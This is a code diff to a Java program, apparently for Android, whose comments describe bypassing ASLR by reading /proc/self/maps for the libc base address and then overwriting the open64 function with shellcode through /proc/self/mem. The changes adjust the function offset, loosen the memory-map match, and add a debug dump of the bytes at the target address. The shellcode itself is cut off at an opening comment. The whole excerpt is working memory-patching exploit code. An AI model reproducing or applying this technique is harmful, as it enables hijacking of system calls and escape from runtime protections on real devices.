@@ -12,15 +12,17 @@ public class RunnerMain {
 
         Long libcbase = null;
         final long OFFSET_CONST = 0x003d000L;
-        final long OPENAT_OFFSET = 0x000000000005f800L - OFFSET_CONST; //open64 offset in libc
+        // final long OPENAT_OFFSET = 0x000000000005f800L - OFFSET_CONST; //open64 offset in libc
+        final long OPENAT_OFFSET = 0x000000000005f800L; //open64 offset in libc on aws vm
 
         // bypass ASLR: find libc base address
         try (BufferedReader br = new BufferedReader(new FileReader("/proc/self/maps"))) {
             String line;
             while ((line = br.readLine()) != null) {
                 String[] parts = line.split("\\s+");
-                if (line.contains("/apex/com.android.runtime/lib64/bionic/libc.so") && parts[1].startsWith("r-xp")) {
+                if (line.contains("/apex/com.android.runtime/lib64/bionic/libc.so")) {
                     libcbase = Long.parseUnsignedLong(parts[0].split("-")[0], 16);
+                    break;
                 }
             }
         } catch (IOException e) {
@@ -40,6 +42,15 @@ public class RunnerMain {
 
         // write shellcode to open64
         try (RandomAccessFile raf = new RandomAccessFile("/proc/self/mem", "rw")) {
+            raf.seek(addr);
+
+            byte[] output = new byte[16];
+            int readAmount = raf.read(output);
+            System.out.println("read: " + readAmount);
+            for (int i = 0; i < readAmount; i++) {
+                System.out.print(String.format("%02X", output[i]));
+            }
+
             raf.seek(addr);
 
             /*
